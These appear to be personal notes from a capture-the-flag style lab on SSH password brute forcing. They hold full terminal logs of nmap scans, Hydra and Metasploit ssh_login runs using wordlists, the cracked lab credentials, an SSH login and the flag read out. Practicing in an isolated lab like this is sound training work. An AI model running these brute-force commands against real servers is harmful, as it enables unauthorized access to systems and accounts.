#### SSH

- SSH (Secure shell) is a remote administration protocol that offers encryption and is the successor to Telnet
- It is typically used for remote access to servers and systems
- SSH used TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port
- SSH authetication can be configured in two ways:
	- Username and password authentication
	- Key based authentication
- In the case of username and password authentication, we can perform a brute force attack on the SSH server in order to identify legitimate credentials and consequently gain access to the target system.

---

In this lab, run the following auxiliary modules against the target:

- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- Use **/usr/share/metasploit-framework/data/wordlists/common_users.txt** username dictionary
- Use **/usr/share/metasploit-framework/data/wordlists/common_passwords.txt** password dictionary

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
9785: eth0@if9786: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
9788: eth1@if9789: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:8e:06:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.142.6.2/24 brd 192.142.6.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# ping -c 5 192.142.6.3
bash: ping: command not found
root@attackdefense:~# nmap 192.142.6.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-20 11:43 UTC
Nmap scan report for target-1 (192.142.6.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:8E:06:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
root@attackdefense:~# nmap -sV 192.142.6.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-20 11:44 UTC
Nmap scan report for target-1 (192.142.6.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:8E:06:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.142.6.3 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-20 11:45:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 350 login tries (l:7/p:50), ~22 tries per task
[DATA] attacking ssh://192.142.6.3:22/
[22][ssh] host: 192.142.6.3   login: sysadmin   password: hailey
[22][ssh] host: 192.142.6.3   login: rooty   password: pineapple
[22][ssh] host: 192.142.6.3   login: demo   password: butterfly1
[22][ssh] host: 192.142.6.3   login: auditor   password: xbox360
[22][ssh] host: 192.142.6.3   login: anon   password: 741852963
[22][ssh] host: 192.142.6.3   login: administrator   password: password1
[22][ssh] host: 192.142.6.3   login: diag   password: secret
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-20 11:46:32
root@attackdefense:~# ssh sysadmin@192.142.6.3
The authenticity of host '192.142.6.3 (192.142.6.3)' can't be established.
ECDSA key fingerprint is SHA256:zGNTowzJbclHjyQjvSQhFLM/JSfNrmfxnj8iGRzVwhc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '192.142.6.3' (ECDSA) to the list of known hosts.
sysadmin@192.142.6.3's password: 
Welcome to Ubuntu 19.04 (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
sysadmin@victim-1:~$ find / -name "flag"
find: ‘/home/anon/.cache’: Permission denied
find: ‘/home/demo/.cache’: Permission denied
find: ‘/home/diag/.cache’: Permission denied
find: ‘/home/rooty/.cache’: Permission denied
find: ‘/home/administrator/.cache’: Permission denied
find: ‘/home/auditor/.cache’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/lib/private’: Permission denied
find: ‘/var/log/private’: Permission denied
find: ‘/var/cache/apt/archives/partial’: Permission denied
find: ‘/var/cache/ldconfig’: Permission denied
find: ‘/var/cache/private’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/root’: Permission denied
find: ‘/proc/tty/driver’: Permission denied
find: ‘/proc/1/task/1/fd’: Permission denied
find: ‘/proc/1/task/1/fdinfo’: Permission denied
find: ‘/proc/1/task/1/ns’: Permission denied
find: ‘/proc/1/fd’: Permission denied
find: ‘/proc/1/map_files’: Permission denied
find: ‘/proc/1/fdinfo’: Permission denied
find: ‘/proc/1/ns’: Permission denied
find: ‘/proc/7/task/7/fd’: Permission denied
find: ‘/proc/7/task/7/fdinfo’: Permission denied
find: ‘/proc/7/task/7/ns’: Permission denied
find: ‘/proc/7/fd’: Permission denied
find: ‘/proc/7/map_files’: Permission denied
find: ‘/proc/7/fdinfo’: Permission denied
find: ‘/proc/7/ns’: Permission denied
find: ‘/proc/16/task/16/fd’: Permission denied
find: ‘/proc/16/task/16/fdinfo’: Permission denied
find: ‘/proc/16/task/16/ns’: Permission denied
find: ‘/proc/16/fd’: Permission denied
find: ‘/proc/16/map_files’: Permission denied
find: ‘/proc/16/fdinfo’: Permission denied
find: ‘/proc/16/ns’: Permission denied
find: ‘/proc/17/task/17/fd’: Permission denied
find: ‘/proc/17/task/17/fdinfo’: Permission denied
find: ‘/proc/17/task/17/ns’: Permission denied
find: ‘/proc/17/fd’: Permission denied
find: ‘/proc/17/map_files’: Permission denied
find: ‘/proc/17/fdinfo’: Permission denied
find: ‘/proc/17/ns’: Permission denied
find: ‘/proc/341/task/341/fd’: Permission denied
find: ‘/proc/341/task/341/fdinfo’: Permission denied
find: ‘/proc/341/task/341/ns’: Permission denied
find: ‘/proc/341/fd’: Permission denied
find: ‘/proc/341/map_files’: Permission denied
find: ‘/proc/341/fdinfo’: Permission denied
find: ‘/proc/341/ns’: Permission denied
find: ‘/proc/356/task/356/fd’: Permission denied
find: ‘/proc/356/task/356/fdinfo’: Permission denied
find: ‘/proc/356/task/356/ns’: Permission denied
find: ‘/proc/356/fd’: Permission denied
find: ‘/proc/356/map_files’: Permission denied
find: ‘/proc/356/fdinfo’: Permission denied
find: ‘/proc/356/ns’: Permission denied
/flag
sysadmin@victim-1:~$ cd /
sysadmin@victim-1:/$ ls
bin  boot  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
sysadmin@victim-1:/$ cat flag 
eb09cc6f1cd72756da145892892fbf5a
sysadmin@victim-1:/$ exit
logout
Connection to 192.142.6.3 closed.
root@attackdefense:~#
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 2003 exploits - 1100 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

msf5 > search ssh_version

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  auxiliary/fuzzers/ssh/ssh_version_15                        normal  No     SSH 1.5 Version Fuzzer
   1  auxiliary/fuzzers/ssh/ssh_version_2                         normal  No     SSH 2.0 Version Fuzzer
   2  auxiliary/fuzzers/ssh/ssh_version_corrupt                   normal  No     SSH Version Corruption
   3  auxiliary/scanner/ssh/ssh_version                           normal  No     SSH Version Scanner


msf5 > use 3
msf5 auxiliary(scanner/ssh/ssh_version) > set rhosts 192.142.6.3
rhosts => 192.142.6.3
msf5 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.142.6.3:22        - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.142.6.3:22        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_version) > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


msf5 auxiliary(scanner/ssh/ssh_version) > use 0
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.142.6.3
rhosts => 192.142.6.3
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.142.6.3:22 - Success: 'sysadmin:hailey' ''
[*] Command shell session 2 opened (192.142.6.2:32931 -> 192.142.6.3:22) at 2023-07-20 11:57:53 +0000
[+] 192.142.6.3:22 - Success: 'rooty:pineapple' ''
[*] Command shell session 3 opened (192.142.6.2:40683 -> 192.142.6.3:22) at 2023-07-20 11:59:13 +0000
[+] 192.142.6.3:22 - Success: 'demo:butterfly1' ''
[*] Command shell session 4 opened (192.142.6.2:42655 -> 192.142.6.3:22) at 2023-07-20 12:00:42 +0000
[+] 192.142.6.3:22 - Success: 'auditor:xbox360' ''
[*] Command shell session 5 opened (192.142.6.2:44871 -> 192.142.6.3:22) at 2023-07-20 12:02:30 +0000
[+] 192.142.6.3:22 - Success: 'anon:741852963' ''
[*] Command shell session 6 opened (192.142.6.2:34701 -> 192.142.6.3:22) at 2023-07-20 12:04:44 +0000
[+] 192.142.6.3:22 - Success: 'administrator:password1' ''
[*] Command shell session 7 opened (192.142.6.2:43361 -> 192.142.6.3:22) at 2023-07-20 12:06:58 +0000
[+] 192.142.6.3:22 - Success: 'diag:secret' ''
[*] Command shell session 8 opened (192.142.6.2:44333 -> 192.142.6.3:22) at 2023-07-20 12:09:22 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) >
```

